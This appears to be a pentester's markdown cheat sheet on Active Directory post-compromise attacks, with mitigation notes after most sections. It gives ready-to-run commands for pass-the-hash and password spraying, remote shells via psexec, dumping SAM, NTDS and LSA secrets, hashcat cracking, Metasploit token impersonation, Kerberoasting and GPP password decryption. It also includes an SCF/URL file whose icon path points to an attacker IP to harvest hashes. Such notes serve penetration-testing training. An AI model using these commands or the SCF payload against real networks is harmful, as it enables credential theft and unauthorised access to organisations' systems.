# Active Directory Post Compromise Attacks

---
## Pass the Hash/Password
---

> If able to crack password hash, or can dump SAM hashes, try to pass around network to check for access to other machines on network.

### use crackmapexec
- Pass the password
	- ` crackmapexec smb <ip/CIDR> -u <user> -d <domain> -p <pass>`

- Pass the hash
	- ` crackmapexec smb <ip>CIDR> -u <user> -H <hash> --local-auth`
- Dump sam, ntds, lsa
	- ` crackmapexec smb <ip/CIDER> -u<user> -p <pass> -d <domain> --sam/--ntds/--lsa`

#### Local vs Domain pass spraying
- pass spray local not domain as domain accounts will get locked out where local will not

---
## Move Laterally
---
- If lateral access is found, can use psexec.py to gain shell on new machine
	` psexec.py <domain>/<user>:<password>@<ip> `

- next use secrets.py to dump sam on new machine
	- `secretsdump.py <domain>/<user>:<password>@<ip>`

secrets.py dumps sam hashes, lsa secrets and DPAPI keys

#### NTLM hash can be passed, NTLMV2 cannot
SAM = NTLM hash
crack with hashcat
	- `hashcat -m 1000 hashfile.txt wordlist.txt -O `

---
## Pass Attack Mitigations
---

- Limit account reuse
	- avoid re-using local admin password
	- disable guest and administrator accounts
	- limit who is a local admin (least privilege)

- use strong passwords
	- longer the better
	- avoid common words
	
- privilege access management
	- check out/in sensitvie accounts
	- auto rotate passwords on check out/in
	- limits pass attacks as passwords is constantly rotated

---
## Token Impersonation
---

- What is Token
	- Temp keys to access system/network without needing creds
	- similar to a cookie for the web

- Two types
	- Delegate, created for logging into machine or using RDP
	- Impersonate, "non interactive" such as attaching network drive

### Attack steps
- start metasploit `msfconsole` then use psexec ` use exploit/windows/smb/psexec`
- set options in psexec module then hit run
- `load incognito` to attempt token impersonation
- `list_tokens -u` list available tokens
- `impersonate_token <token name>` use "\\\\" to escape backslash i.e. domain\\user for token name domain\user
- `rev2self` to revert to self after impersonation


#### Token impersonation mitigation
- Limit user/group token creation permissions
- account tiering and isolation
	- regular user account for day to day, admin account for specific needs on specific machines
		- i.e domain admin should only log in to domain controller and not local machines
- local admin restriction


---
## Kerberoasting
---
[kerberoasting hacktricks](https://book.hacktricks.xyz/windows/active-directory-methodology/kerberoast)
[kerberoasting info](https://medium.com/mitigation@Shorty420/kerberoasting-9108477279cc)

### attack steps
- Get SPNs, Dump Hash
	- `GetUserSPNs.py <domain/username:password> -dc-ip <ip of DC> -request`
- attempt crach hash with hashcat
	- `hashcat -m 13100 kerberoasthash.txt rockyou.txt`

#### Kerberoasting Mitigations
- strong passwords
- least privilege
	- don't make service accounts domain admins, and dont' give service accounts weak passwords

---
## GPP Attacks
---

locate cpassword in Groups.xml
use gpp-decrypt to decrypt cpassword. 
try to gain shell with creds

---
## URL / SCF Attack
---

file example
```
[InternetShortcut]
URL=blah
WorkingDirectory=blah
IconFile=\\10.10.14.19\%USERNAME%.icon
IconIndex=1
```


